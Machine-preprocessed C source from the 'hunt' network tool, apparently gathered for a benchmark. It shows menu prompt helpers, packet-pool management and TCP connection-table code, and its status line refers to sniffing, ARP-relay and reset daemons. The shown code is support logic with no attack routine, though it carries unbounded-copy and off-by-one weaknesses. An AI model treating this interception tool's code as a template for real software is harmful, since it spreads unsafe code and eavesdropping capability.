#line 433
    if ((int )buf[0] == 10) {
#line 433
      if (dfl) {
#line 434
        i = (int )dfl;
#line 435
        goto while_break;
      }
    }
#line 437
    if ((int )buf[0] == 10) {
#line 438
      i = -1;
#line 439
      goto while_break;
    }
    {
#line 441
    tmp = strchr((char const   *)opt, (int )buf[0]);
    }
#line 441
    if (tmp) {
#line 442
      i = (int )buf[0];
#line 443
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 446
  return (i);
}
}
#line 449 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_char(char *label , char *opt , char dfl ) 
{ 
  int tmp ;

  {
  {
#line 451
  tmp = menu_choose_char_nconn(label, opt, dfl, 0);
  }
#line 451
  return (tmp);
}
}
#line 454 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_yn(char *label , int dfl ) 
{ 
  int retval ;
  int c ;
  int tmp ;

  {
#line 458
  if (dfl) {
#line 458
    tmp = 'y';
  } else {
#line 458
    tmp = 'n';
  }
  {
#line 458
  c = menu_choose_char(label, (char *)"nyx", (char )tmp);
  }
  {
#line 460
  if (c == 110) {
#line 460
    goto case_110;
  }
#line 463
  if (c == 121) {
#line 463
    goto case_121;
  }
#line 466
  goto switch_default;
  case_110: /* CIL Label */ 
#line 461
  retval = 0;
#line 462
  goto switch_break;
  case_121: /* CIL Label */ 
#line 464
  retval = 1;
#line 465
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 467
  retval = -1;
  switch_break: /* CIL Label */ ;
  }
#line 469
  return (retval);
}
}
#line 472 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_string(char *label , char *ret_buf , int buf_len , char *dfl ) 
{ 
  char buf[512] ;
  int len ;
  int min_len ;
  size_t tmp ;
  size_t tmp___0 ;

  {
#line 477
  if (! label) {
#line 478
    label = (char *)"";
  }
  {
#line 479
  set_tty_color((enum TTY_COLOR )15);
  }
#line 480
  if (dfl) {
    {
#line 481
    tmp = strlen((char const   *)label);
    }
#line 481
    if (tmp) {
      {
#line 482
      printf((char const   */* __restrict  */)"%s [%s]> ", label, dfl);
      }
    } else {
      {
#line 484
      printf((char const   */* __restrict  */)"[%s]> ", dfl);
      }
    }
  } else {
    {
#line 486
    printf((char const   */* __restrict  */)"%s> ", label);
    }
  }
  {
#line 487
  fgets((char */* __restrict  */)(buf), (int )sizeof(buf), (FILE */* __restrict  */)stdin);
#line 488
  set_tty_color((enum TTY_COLOR )7);
  }
#line 489
  if ((int )buf[0] == 10) {
#line 490
    if (dfl) {
      {
#line 491
      strcpy((char */* __restrict  */)(buf), (char const   */* __restrict  */)dfl);
      }
    } else {
#line 493
      return (-1);
    }
  }
  {
#line 495
  tmp___0 = strlen((char const   *)(buf));
#line 495
  len = (int )tmp___0;
  }
#line 496
  if ((int )buf[len - 1] == 10) {
#line 497
    buf[len - 1] = (char)0;
  }
#line 498
  if (buf_len < len + 1) {
#line 498
    min_len = buf_len;
  } else {
#line 498
    min_len = len + 1;
  }
  {
#line 499
  memcpy((void */* __restrict  */)ret_buf, (void const   */* __restrict  */)(buf),
         (size_t )min_len);
#line 500
  *(ret_buf + (min_len - 1)) = (char)0;
  }
#line 501
  return (0);
}
}
#line 504 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu(char *head , char *str_menu , char *label , char *opt , char dfl ) 
{ 
  int tmp ;
  size_t tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;

  {
#line 506
  if (! head) {
#line 507
    head = (char *)"";
  }
#line 508
  if (! str_menu) {
#line 509
    str_menu = (char *)"";
  }
  {
#line 510
  set_tty_color_bg((enum TTY_COLOR )0, (enum TTY_COLOR )15);
#line 511
  tmp = packet_count();
#line 511
  printf((char const   */* __restrict  */)"--- %s --- rcvpkt %u, free/alloc %d/%d ---",
         head, pkts_received, tmp, packets_allocated);
#line 513
  print_rst_daemon();
#line 514
  print_arp_relayer_daemon();
#line 515
  print_mac_daemon();
#line 516
  print_sniff_daemon();
#line 517
  printf((char const   */* __restrict  */)"---");
#line 518
  set_tty_color_bg((enum TTY_COLOR )15, (enum TTY_COLOR )0);
#line 519
  printf((char const   */* __restrict  */)"\n");
  }
#line 520
  if (verbose) {
    {
#line 521
    set_tty_color_bg((enum TTY_COLOR )0, (enum TTY_COLOR )15);
#line 522
    tmp___0 = strlen((char const   *)head);
#line 522
    printf((char const   */* __restrict  */)"%*s", tmp___0 + 9UL, " ");
#line 523
    printf((char const   */* __restrict  */)"droppkt %u, other proto pkt %u", pkts_dropped,
           pkts_unhandled);
#line 525
    set_tty_color_bg((enum TTY_COLOR )15, (enum TTY_COLOR )0);
#line 526
    printf((char const   */* __restrict  */)"\n");
    }
  }
  {
#line 528
  printf((char const   */* __restrict  */)"%s", str_menu);
#line 529
  set_tty_color((enum TTY_COLOR )7);
  }
#line 530
  if (th_hunt) {
    {
#line 531
    tmp___1 = pthread_kill(th_hunt, 0);
    }
#line 531
    if (tmp___1 != 0) {
      {
#line 532
      set_tty_color((enum TTY_COLOR )9);
#line 533
      printf((char const   */* __restrict  */)"hunt failed - please restart the program");
#line 534
      set_tty_color((enum TTY_COLOR )7);
      }
    }
  }
  {
#line 537
  tmp___2 = menu_choose_char_nconn(label, opt, dfl, 1);
  }
#line 537
  return (tmp___2);
}
}
#line 540 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
void press_key(char *label ) 
{ 


  {
#line 542
  if (! label) {
#line 543
    label = (char *)"";
  }
  {
#line 544
  set_tty_color((enum TTY_COLOR )15);
#line 545
  printf((char const   */* __restrict  */)"%s", label);
#line 546
  fflush(stdout);
#line 547
  getchar();
#line 548
  set_tty_color((enum TTY_COLOR )7);
  }
#line 549
  return;
}
}
#line 551 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_sdb(char *label , char dfl ) 
{ 
  char *str ;
  char __label[128] ;
  char *lbl ;
  char buf[64] ;
  char __buf_dfl[2] ;
  char *buf_dfl ;
  int tmp ;
  char *tmp___0 ;

  {
#line 553
  str = (char *)"[s]rc/[d]st/[b]oth";
#line 558
  if (dfl) {
#line 559
    __buf_dfl[0] = dfl;
#line 560
    __buf_dfl[1] = (char)0;
#line 561
    buf_dfl = __buf_dfl;
  } else {
#line 563
    buf_dfl = (char *)((void *)0);
  }
#line 564
  if (label) {
    {
#line 565
    sprintf((char */* __restrict  */)(__label), (char const   */* __restrict  */)"%s %s",
            label, str);
#line 566
    lbl = __label;
    }
  } else {
#line 568
    lbl = str;
  }
  {
#line 569
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 570
    tmp = menu_prompt(lbl, buf, (int )sizeof(buf), buf_dfl);
    }
#line 570
    if (tmp < 0) {
#line 571
      return (-1);
    }
    {
#line 572
    tmp___0 = strchr("sdb", (int )buf[0]);
    }
#line 572
    if (tmp___0) {
#line 573
      return ((int )buf[0]);
    } else {
      {
#line 575
      printf((char const   */* __restrict  */)"bad src/dst/both\n");
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
}
}
#line 579 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
char int_to_sdb(int mode ) 
{ 
  char retval ;

  {
  {
#line 584
  if (mode == 0) {
#line 584
    goto case_0;
  }
#line 587
  if (mode == 1) {
#line 587
    goto case_1;
  }
#line 590
  if (mode == 2) {
#line 590
    goto case_2;
  }
#line 593
  goto switch_default;
  case_0: /* CIL Label */ 
#line 585
  retval = (char )'s';
#line 586
  goto switch_break;
  case_1: /* CIL Label */ 
#line 588
  retval = (char )'d';
#line 589
  goto switch_break;
  case_2: /* CIL Label */ 
#line 591
  retval = (char )'b';
#line 592
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 594
  retval = (char)-1;
#line 595
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 597
  return (retval);
}
}
#line 600 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int sdb_to_int(char mode ) 
{ 
  int retval ;

  {
  {
#line 605
  if ((int )mode == 115) {
#line 605
    goto case_115;
  }
#line 608
  if ((int )mode == 100) {
#line 608
    goto case_100;
  }
#line 611
  if ((int )mode == 98) {
#line 611
    goto case_98;
  }
#line 614
  goto switch_default;
  case_115: /* CIL Label */ 
#line 606
  retval = 0;
#line 607
  goto switch_break;
  case_100: /* CIL Label */ 
#line 609
  retval = 1;
#line 610
  goto switch_break;
  case_98: /* CIL Label */ 
#line 612
  retval = 2;
#line 613
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 615
  retval = -1;
#line 616
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 618
  return (retval);
}
}
#line 621 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
char *sdbmode_to_char(int mode ) 
{ 
  char *str_mode ;

  {
  {
#line 626
  if (mode == 0) {
#line 626
    goto case_0;
  }
#line 629
  if (mode == 1) {
#line 629
    goto case_1;
  }
#line 632
  if (mode == 2) {
#line 632
    goto case_2;
  }
#line 635
  goto switch_default;
  case_0: /* CIL Label */ 
#line 627
  str_mode = (char *)"src";
#line 628
  goto switch_break;
  case_1: /* CIL Label */ 
#line 630
  str_mode = (char *)"dst";
#line 631
  goto switch_break;
  case_2: /* CIL Label */ 
#line 633
  str_mode = (char *)"both";
#line 634
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 636
  str_mode = (char *)"err";
#line 637
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 639
  return (str_mode);
}
}
#line 156 "/usr/include/x86_64-linux-gnu/sys/socket.h"
extern ssize_t recv(int __fd , void *__buf , size_t __n , int __flags ) ;
#line 192 "/usr/include/time.h"
extern  __attribute__((__nothrow__)) time_t ( __attribute__((__leaf__)) time)(time_t *__timer ) ;
#line 141 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct hash conn_table  ;
#line 142 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct hash mac_table  ;
#line 146
struct list l_ifunc_udp ;
#line 319
unsigned int bytes_received ;
#line 326
int mac_learn_from_ip ;
#line 333
void packet_preallocate(int count___0 ) ;
#line 338
int conn_exist(struct user_conn_info *uci ) ;
#line 345
void print_user_conn_info(struct user_conn_info *uci , int count___0 ) ;
#line 347
void remove_conn_if_dont_match(void) ;
#line 349
void print_mac_table(void) ;
#line 28 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int linksock  =    -1;
#line 29 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int mac_learn_from_ip  =    0;
#line 31 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int conn_list_mac  =    0;
#line 32 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int conn_list_seq  =    0;
#line 37 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int hunt_ready  =    0;
#line 38 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
pthread_mutex_t mutex_hunt_ready  =    {{0, 0U, 0, 0U, 0, (short)0, (short)0, {(struct __pthread_internal_list *)0, (struct __pthread_internal_list *)0}}};
#line 39 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
pthread_cond_t cond_hunt_ready  =    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}};
#line 45 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_skip_update  = 
#line 45
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet_info *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 50 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_ifunc_ip  = 
#line 50
     {(void *)0, (void *)0, (int )((char *)(& ((struct ifunc_item *)0)->next_ip) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 51 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_ifunc_tcp  = 
#line 51
     {(void *)0, (void *)0, (int )((char *)(& ((struct ifunc_item *)0)->next_tcp) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 52 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_ifunc_udp  = 
#line 52
     {(void *)0, (void *)0, (int )((char *)(& ((struct ifunc_item *)0)->next_udp) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 53 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_ifunc_icmp  = 
#line 53
     {(void *)0, (void *)0, (int )((char *)(& ((struct ifunc_item *)0)->next_icmp) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 54 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_ifunc_arp  = 
#line 54
     {(void *)0, (void *)0, (int )((char *)(& ((struct ifunc_item *)0)->next_arp) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 55 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct list l_ifunc_fast_tcp  = 
#line 55
     {(void *)0, (void *)0, (int )((char *)(& ((struct ifunc_item *)0)->next_tcp) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 63 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static struct list l_packets  = 
#line 63
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next_free) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 64 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int packets_allocated  =    0;
#line 66 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct packet *packet_new(void) 
{ 
  struct packet *p ;
  void *tmp ;
  void *tmp___0 ;

  {
  {
#line 70
  tmp___0 = list_pop(& l_packets);
#line 70
  p = (struct packet *)tmp___0;
  }
#line 70
  if (! p) {
    {
#line 71
    tmp = malloc(sizeof(struct packet ));
#line 71
    p = (struct packet *)tmp;
    }
#line 71
    if (! p) {
      {
#line 72
      perror("malloc");
      }
#line 73
      return ((struct packet *)((void *)0));
    }
    {
#line 75
    pthread_mutex_init(& p->p_mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 76
    p->p_use_count = 0;
#line 77
    p->p_hdr.p_tcph = (struct tcphdr *)((void *)0);
#line 78
    p->p_data = (char *)((void *)0);
#line 79
    p->p_type = (enum PACKET_TYPE )0;
#line 80
    p->p_ipc = 0;
#line 81
    p->p_ipc_arg = (void *)0;
#line 83
    packets_allocated ++;
    }
  }
#line 85
  p->p_use_count = 1;
#line 86
  return (p);
}
}
#line 89 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void packet_copy_data(struct packet *dst , struct packet *src ) 
{ 


  {
  {
#line 91
  memcpy((void */* __restrict  */)(dst->p_raw), (void const   */* __restrict  */)(src->p_raw),
         (size_t )src->p_raw_len);
#line 92
  dst->p_raw_len = src->p_raw_len;
#line 93
  dst->p_type = src->p_type;
#line 94
  dst->p_ethh = (struct ethhdr *)(dst->p_raw + ((char *)src->p_ethh - src->p_raw));
#line 96
  dst->p_iph = (struct iphdr *)(dst->p_raw + ((char *)src->p_iph - src->p_raw));
#line 98
  dst->p_arph = (struct arphdr *)(dst->p_raw + ((char *)src->p_arph - src->p_raw));
#line 100
  dst->p_hdr.p_tcph = (struct tcphdr *)(dst->p_raw + ((char *)src->p_hdr.p_tcph - src->p_raw));
#line 102
  dst->p_data_len = src->p_data_len;
#line 103
  dst->p_data = dst->p_raw + (src->p_data - src->p_raw);
#line 104
  memcpy((void */* __restrict  */)(dst->p_arg), (void const   */* __restrict  */)(src->p_arg),
         sizeof(src->p_arg));
#line 105
  dst->p_ipc = src->p_ipc;
#line 106
  dst->p_ipc_arg = src->p_ipc_arg;
  }
#line 107
  return;
}
}
#line 109 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void packet_free(struct packet *p ) 
{ 
  int is_free ;

  {
  {
#line 113
  pthread_mutex_lock(& p->p_mutex);
#line 114
  (p->p_use_count) --;
  }
#line 114
  if (p->p_use_count == 0) {
#line 115
    is_free = 1;
  } else {
#line 117
    is_free = 0;
  }
  {
#line 118
  pthread_mutex_unlock(& p->p_mutex);
  }
#line 119
  if (is_free) {
    {
#line 120
    list_push(& l_packets, (void *)p);
    }
  }
#line 121
  return;
}
}
#line 123 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void packet_want(struct packet *p ) 
{ 


  {
  {
#line 125
  pthread_mutex_lock(& p->p_mutex);
#line 126
  (p->p_use_count) ++;
#line 127
  pthread_mutex_unlock(& p->p_mutex);
  }
#line 128
  return;
}
}
#line 130 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void packet_flush(struct list *l ) 
{ 
  struct packet *p ;
  void *tmp ;

  {
  {
#line 134
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 134
    tmp = list_pop(l);
#line 134
    p = (struct packet *)tmp;
    }
#line 134
    if (! p) {
#line 134
      goto while_break;
    }
    {
#line 135
    packet_free(p);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 136
  return;
}
}
#line 138 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void packet_preallocate(int count___0 ) 
{ 
  struct packet **p ;
  void *tmp ;
  int i ;

  {
  {
#line 140
  tmp = __builtin_alloca((unsigned long )count___0 * sizeof(struct packet *));
#line 140
  p = (struct packet **)tmp;
#line 143
  i = 0;
  }
  {
#line 143
  while (1) {
    while_continue: /* CIL Label */ ;
#line 143
    if (! (i < count___0)) {
#line 143
      goto while_break;
    }
    {
#line 144
    *(p + i) = packet_new();
#line 143
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 145
  i = 0;
  {
#line 145
  while (1) {
    while_continue___0: /* CIL Label */ ;
#line 145
    if (! (i < count___0)) {
#line 145
      goto while_break___0;
    }
    {
#line 146
    packet_free(*(p + i));
#line 145
    i ++;
    }
  }
  while_break___0: /* CIL Label */ ;
  }
#line 147
  return;
}
}
#line 149 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int packet_count(void) 
{ 
  int tmp ;

  {
  {
#line 151
  tmp = list_count(& l_packets);
  }
#line 151
  return (tmp);
}
}
#line 159 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
__inline static void fill_uci(struct user_conn_info *uci , struct packet *p ) 
{ 


  {
#line 161
  uci->src_addr = (unsigned long )(p->p_iph)->saddr;
#line 162
  uci->dst_addr = (unsigned long )(p->p_iph)->daddr;
#line 163
  uci->src_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source;
#line 164
  uci->dst_port = (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest;
#line 165
  return;
}
}
#line 184 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static int ht_eq(unsigned int key , struct conn_info *c , struct user_conn_info *uci ) 
{ 


  {
#line 187
  if (c->src_addr == uci->src_addr) {
#line 187
    if (c->dst_addr == uci->dst_addr) {
#line 187
      if ((int )c->src_port == (int )uci->src_port) {
#line 187
        if ((int )c->dst_port == (int )uci->dst_port) {
#line 191
          return (1);
        }
      }
    }
  }
#line 192
  if (c->src_addr == uci->dst_addr) {
#line 192
    if (c->dst_addr == uci->src_addr) {
#line 192
      if ((int )c->src_port == (int )uci->dst_port) {
#line 192
        if ((int )c->dst_port == (int )uci->src_port) {
#line 196
          return (1);
        }
      }
    }
  }
#line 197
  return (0);
}
}
#line 201 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void remove_conn_if_dont_match(void) 
{ 
  struct hash_iterator hi ;
  struct conn_info *ci ;
  unsigned int key ;
  int count_to_remove ;
  unsigned int *key_to_remove ;
  struct conn_info **ci_to_remove ;
  int tmp ;
  void *tmp___0 ;
  int tmp___1 ;
  void *tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  void *tmp___5 ;

  {
  {
#line 206
  count_to_remove = 0;
#line 210
  hash_lock(& conn_table);
#line 211
  count_to_remove = 0;
#line 212
  tmp = hash_count(& conn_table);
#line 212
  tmp___0 = __builtin_alloca(sizeof(unsigned int ) * (unsigned long )tmp);
#line 212
  key_to_remove = (unsigned int *)tmp___0;
#line 213
  tmp___1 = hash_count(& conn_table);
#line 213
  tmp___2 = __builtin_alloca(sizeof(struct conn_info *) * (unsigned long )tmp___1);
#line 213
  ci_to_remove = (struct conn_info **)tmp___2;
#line 214
  hash_iter_set(& hi, & conn_table);
  }
  {
#line 215
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 215
    tmp___5 = hash_iter_get(& hi, & key);
#line 215
    ci = (struct conn_info *)tmp___5;
    }
#line 215
    if (! ci) {
#line 215
      goto while_break;
    }
    {
#line 216
    tmp___4 = conn_add_match((unsigned int )ci->src_addr, (unsigned int )ci->dst_addr,
                             ci->src_port, ci->dst_port);
    }
#line 216
    if (! tmp___4) {
#line 217
      *(ci_to_remove + count_to_remove) = ci;
#line 218
      tmp___3 = count_to_remove;
#line 218
      count_to_remove ++;
#line 218
      *(key_to_remove + tmp___3) = key;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 221
  hash_iter_end(& hi);
  }
  {
#line 222
  while (1) {
    while_continue___0: /* CIL Label */ ;
#line 222
    if (! (count_to_remove >= 0)) {
#line 222
      goto while_break___0;
    }
    {
#line 223
    hash_remove(& conn_table, *(key_to_remove + count_to_remove), (void *)*(ci_to_remove + count_to_remove));
#line 222
    count_to_remove --;
    }
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 225
  hash_unlock(& conn_table);
  }
#line 226
  return;
}
}
#line 228 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
void conn_free(struct conn_info *ci ) 
{ 
  int free_it ;

  {
  {
#line 232
  pthread_mutex_lock(& ci->mutex);
#line 233
  (ci->use_count) --;
  }
#line 233
  if (ci->use_count == 0) {
#line 234
    free_it = 1;
  } else {
#line 236
    free_it = 0;
  }
  {
#line 237
  pthread_mutex_unlock(& ci->mutex);
  }
#line 238
  if (free_it) {
    {
#line 239
    free((void *)ci);
    }
  }
#line 240
  return;
}
}
#line 242 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
struct conn_info *conn_get(struct user_conn_info *uci ) 
{ 
  unsigned int key ;
  struct conn_info *ci ;
  void *tmp ;

  {
  {
#line 247
  key = uci_generate_key(uci);
#line 248
  hash_lock(& conn_table);
#line 249
  tmp = hash_get(& conn_table, key, (void *)uci);
#line 249
  ci = (struct conn_info *)tmp;
  }
#line 249
  if (ci) {
    {
#line 250
    pthread_mutex_lock(& ci->mutex);
#line 251
    (ci->use_count) ++;
#line 252
    pthread_mutex_unlock(& ci->mutex);
    }
  }
  {
#line 254
  hash_unlock(& conn_table);
  }
#line 255
  return (ci);
}
}
#line 258 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
int conn_exist(struct user_conn_info *uci ) 
{ 
  unsigned int key ;
  struct conn_info *ci ;
  void *tmp ;

  {
  {
#line 263
  key = uci_generate_key(uci);
#line 264
  tmp = hash_get(& conn_table, key, (void *)uci);
#line 264
  ci = (struct conn_info *)tmp;
  }
#line 264
  if (ci) {
#line 265
    return (1);
  } else {
#line 267
    return (0);
  }
}
}
#line 270 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static int packet_match(struct packet_info *pi , struct packet *p ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  int tmp ;
  int tmp___0 ;

  {
#line 272
  iph = p->p_iph;
#line 273
  tcph = p->p_hdr.p_tcph;
#line 275
  if (pi->src_addr == (unsigned long )iph->saddr) {
#line 275
    if (pi->dst_addr == (unsigned long )iph->daddr) {
#line 275
      if ((int )pi->src_port == (int )tcph->__annonCompField3.__annonCompField2.source) {
#line 275
        if ((int )pi->dst_port == (int )tcph->__annonCompField3.__annonCompField2.dest) {
#line 275
          if (pi->src.next_seq == (unsigned long )tcph->__annonCompField3.__annonCompField2.seq) {
#line 275
            if (pi->src.next_d_seq == (unsigned long )tcph->__annonCompField3.__annonCompField2.ack_seq) {
              {
#line 275
              tmp = memcmp((void const   *)(pi->src.src_mac), (void const   *)((p->p_ethh)->h_source),
                           (size_t )6);
              }
#line 275
              if (tmp == 0) {
                {
#line 275
                tmp___0 = memcmp((void const   *)(pi->src.dst_mac), (void const   *)((p->p_ethh)->h_dest),
                                 (size_t )6);
                }
#line 275
                if (tmp___0 == 0) {
#line 283
                  return (1);
                } else {
#line 285
                  return (0);
                }
              } else {
#line 285
                return (0);
              }
            } else {
#line 285
              return (0);
            }
          } else {
#line 285
            return (0);
          }
        } else {
#line 285
          return (0);
        }
      } else {
#line 285
        return (0);
      }
    } else {
#line 285
      return (0);
    }
  } else {
#line 285
    return (0);
  }
}
}
#line 288 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static int conn_skip_update(struct conn_info *ci , struct packet *p ) 
{ 
  struct list_iterator iter ;
  struct packet_info *pi ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 293
  list_iter_set(& iter, & l_skip_update);
  }
  {
#line 294
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 294
    tmp___0 = list_iter_get(& iter);
#line 294
    pi = (struct packet_info *)tmp___0;
    }
#line 294
    if (! pi) {
#line 294
      goto while_break;
    }
    {
#line 295
    tmp = packet_match(pi, p);
    }
#line 295
    if (tmp) {
      {
#line 296
      list_iter_end(& iter);
#line 297
      list_remove(& l_skip_update, (void *)pi);
      }
#line 298
      return (1);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 301
  list_iter_end(& iter);
  }
#line 302
  return (0);
}
}
#line 305 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c"
static void __conn_add(struct packet *p , unsigned int key ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  struct conn_info *ci ;
  struct host_info *h_src ;
  struct host_info *h_dst ;
  void *tmp ;
  uint16_t tmp___0 ;
  uint16_t tmp___1 ;
  int tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;

  {
  {
#line 307
  iph = p->p_iph;
#line 308
  tcph = p->p_hdr.p_tcph;
#line 312
  tmp = malloc(sizeof(struct conn_info ));
#line 312
  ci = (struct conn_info *)tmp;
  }
#line 313
  if (! ci) {
    {
#line 313
    __assert_fail("ci", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.c",
                  313U, "__conn_add");
    }
  }
  {
#line 314
  memset((void *)ci, 0, sizeof(struct conn_info ));
#line 315
  ci->use_count = 1;
#line 316
  pthread_mutex_init(& ci->mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 318
  tmp___0 = ntohs(tcph->__annonCompField3.__annonCompField2.dest);
  }
#line 318
  if ((int )tmp___0 >= 1024) {
    {
#line 318
    tmp___1 = ntohs(tcph->__annonCompField3.__annonCompField2.source);
    }
#line 318
    if ((int )tmp___1 < 1024) {
#line 319
      ci->src_addr = (unsigned long )iph->daddr;
#line 320
      ci->dst_addr = (unsigned long )iph->saddr;
#line 321
      ci->src_port = tcph->__annonCompField3.__annonCompField2.dest;
#line 322
      ci->dst_port = tcph->__annonCompField3.__annonCompField2.source;
#line 323
      h_src = & ci->dst;
#line 324
      h_dst = & ci->src;
    } else {
#line 318
      goto _L;
    }
  } else {
    _L: /* CIL Label */ 
#line 326
    ci->src_addr = (unsigned long )iph->saddr;
#line 327
    ci->dst_addr = (unsigned long )iph->daddr;
#line 328
    ci->src_port = tcph->__annonCompField3.__annonCompField2.source;
#line 329
